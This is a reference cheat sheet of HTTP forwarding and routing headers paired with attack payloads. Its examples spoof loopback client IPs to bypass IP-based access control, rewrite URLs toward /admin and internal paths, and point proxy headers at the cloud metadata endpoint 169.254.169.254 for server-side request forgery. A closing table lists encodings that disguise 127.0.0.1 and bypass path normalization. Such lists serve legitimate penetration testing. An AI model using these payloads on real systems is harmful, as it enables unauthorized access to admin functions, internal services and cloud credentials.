# Complete HTTP Forwarding & Routing Headers – Accepted Values & Payload Examples

## Main Headers Table

| Header Field | Accepted Value Format(s) | Example Payload(s) / Usage |
|--------------|---------------------------|----------------------------|
| `Forwarded` | `for=<client>;by=<proxy>;host=<host>;proto=<http\|https>` | `Forwarded: for=127.0.0.1;by=10.0.0.1;host=internal.local;proto=http` |
| `X-Forwarded-For` | Comma-separated IPv4/IPv6 list | `X-Forwarded-For: 127.0.0.1, 10.0.0.1` (left-to-right or right-to-left exploitation) |
| `X-Real-IP` | Single IPv4/IPv6 address | `X-Real-IP: 127.0.0.1` |
| `X-Forwarded-Host` | Hostname, domain, or IP | `X-Forwarded-Host: 127.0.0.1`, `X-Forwarded-Host: internal.corp` |
| `X-Forwarded-Proto` | `http` or `https` | `X-Forwarded-Proto: http` (forces HTTP downgrade) |
| `X-Forwarded-Scheme` | `http` or `https` | `X-Forwarded-Scheme: https` |
| `X-Forwarded-Port` | Integer 1–65535 | `X-Forwarded-Port: 8080`, `X-Forwarded-Port: 443` |
| `X-Forwarded-By` | IP address or identifier | `X-Forwarded-By: 10.0.0.1` |
| `X-Forwarded-Server` | Hostname or IP | `X-Forwarded-Server: proxy1.example.com` |
| `X-Forwarded-For-Original` | IP list (unchanged original) | `X-Forwarded-For-Original: 1.2.3.4, 5.6.7.8` |
| `CF-Connecting-IP` | Single IPv4/IPv6 | `CF-Connecting-IP: 8.8.8.8` |
| `True-Client-IP` | Single IP | `True-Client-IP: 10.0.0.99` |
| `Fastly-Client-IP` | Single IP | `Fastly-Client-IP: 192.168.1.1` |
| `X-Azure-ClientIP` | Single IP | `X-Azure-ClientIP: 127.0.0.1` |
| `X-Azure-SocketIP` | Single IP | `X-Azure-SocketIP: 127.0.0.1` |
| `Incap-Client-IP` | Single IP | `Incap-Client-IP: 127.0.0.1` |
| `X-Sucuri-ClientIP` | Single IP | `X-Sucuri-ClientIP: 172.16.0.1` |
| `Ali-CDN-Real-IP` | Single IP | `Ali-CDN-Real-IP: 10.0.0.1` |
| `Client-IP` | Single IP | `Client-IP: 127.0.0.1` |
| `X-Client-IP` | Single IP | `X-Client-IP: 127.0.0.1` |
| `X-Cluster-Client-IP` | Single IP | `X-Cluster-Client-IP: 127.0.0.1` |
| `X-Originating-IP` | Single IP | `X-Originating-IP: 127.0.0.1` |
| `X-True-IP` | Single IP | `X-True-IP: 127.0.0.1` |
| `X-Source-IP` | Single IP | `X-Source-IP: 127.0.0.1` |
| `X-Remote-IP` | Single IP | `X-Remote-IP: 127.0.0.1` |
| `X-Remote-Addr` | Single IP | `X-Remote-Addr: 127.0.0.1` |
| `X-ProxyUser-Ip` | Single IP | `X-ProxyUser-Ip: 10.20.30.40` |
| `Proxy-Client-IP` | Single IP | `Proxy-Client-IP: 127.0.0.1` |
| `WL-Proxy-Client-IP` | Single IP | `WL-Proxy-Client-IP: 127.0.0.1` |
| `X-Original-URL` | Absolute URI or path | `X-Original-URL: /admin`, `X-Original-URL: /internal/secret` |
| `X-Rewrite-URL` | Absolute URI or path | `X-Rewrite-URL: /admin`, `X-Rewrite-URL: http://127.0.0.1/` |
| `X-Http-Destinationurl` | Absolute URL | `X-Http-Destinationurl: http://127.0.0.1/` |
| `Destination` (RFC 2518) | Absolute URI | `Destination: http://metadata.internal/latest/` |
| `X-Host` | Hostname or IP | `X-Host: 127.0.0.1` |
| `Proxy-Host` | Hostname or IP | `Proxy-Host: internal-api` |
| `X-Http-Host-Override` | Hostname or IP | `X-Http-Host-Override: admin.local` |
| `Request-Uri` | URI string | `Request-Uri: /admin` |
| `Uri` | URI string | `Uri: /api/private` |
| `Url` | Full URL | `Url: http://127.0.0.1/admin` |
| `Base-Url` | Absolute URL | `Base-Url: http://127.0.0.1` |
| `Http-Url` | Absolute URL | `Http-Url: https://internal/` |
| `Proxy-Url` | Absolute URL | `Proxy-Url: http://169.254.169.254/latest/meta-data/` |
| `X-Proxy-Url` | Absolute URL | `X-Proxy-Url: http://localhost:8080/` |
| `Max-Forwards` | Integer >= 0 | `Max-Forwards: 0` (prevents TRACE propagation) |
| `Via` | Protocol/version node | `Via: 1.1 proxy1` |
| `X-Custom-IP-Authorization` | IP address (custom logic) | `X-Custom-IP-Authorization: 127.0.0.1` |

## Additional Encoding Variants for IP & Host Headers

These payloads can be used in any header that expects an IP address (e.g., `X-Forwarded-For`, `X-Real-IP`, `CF-Connecting-IP`, etc.):

| Variant Type | Example Payload | Effective Resolution |
|--------------|------------------|----------------------|
| Shortened IPv4 | `127.1` | `127.0.0.1` |
| Dotted Decimal Integer | `2130706433` | `127.0.0.1` |
| Hexadecimal | `0x7f000001` | `127.0.0.1` |
| Octal Dotted | `0177.0000.0000.0001` | `127.0.0.1` |
| IPv6 Loopback | `[::1]` | IPv6 localhost |
| IPv4-mapped IPv6 | `[::ffff:127.0.0.1]` | `127.0.0.1` |
| Multi-IP prepend chain | `127.0.0.1, 8.8.8.8` | Exploits leftmost extraction |
| Multi-IP append chain | `8.8.8.8, 127.0.0.1` | Exploits rightmost extraction |
| Wildcard DNS service (for host headers) | `127.0.0.1.nip.io` | Resolves to `127.0.0.1` |
| User-Info abuse (host headers) | `spoofed.com@127.0.0.1` | Connection targets `127.0.0.1` |
| Path normalization bypass (URI headers) | `/./admin`, `/admin/..;` | Backend normalizes to `/admin` |
